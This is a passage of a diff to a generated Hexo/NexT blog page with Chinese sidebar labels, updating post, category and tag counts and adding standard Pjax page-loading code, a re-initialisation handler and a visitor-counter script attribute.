+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -643,7 +662,7 @@
 
         
 <div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
     <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
       <span class="post-meta-item-icon">
         <i class="user"></i>
@@ -678,6 +697,7 @@
   
   <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
 
@@ -691,6 +711,65 @@
 
 <script src="/js/next-boot.js"></script>
 
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
 
 
 
@@ -710,10 +789,12 @@
 
 
 
+    <div id="pjax">
   
 
   
 
+    </div>
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
 </html>
 <!-- 页面点击小红心 -->
